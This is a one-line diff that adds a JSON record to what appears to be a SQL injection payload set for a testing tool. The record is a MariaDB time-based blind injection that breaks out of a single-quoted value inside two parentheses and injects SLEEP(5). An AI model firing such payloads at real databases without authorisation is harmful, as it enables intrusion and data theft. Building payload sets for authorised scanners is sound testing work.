@@ -1,0 +1,1 @@
+{"dbms": "mariadb", "technique": "time", "boundary": {"prefix": "'))", "suffix": "-- -", "type": "paren2-single"}, "vector": "{B} AND (SELECT SLEEP(5))", "comment": "mariadb time: single in 2 parens"}
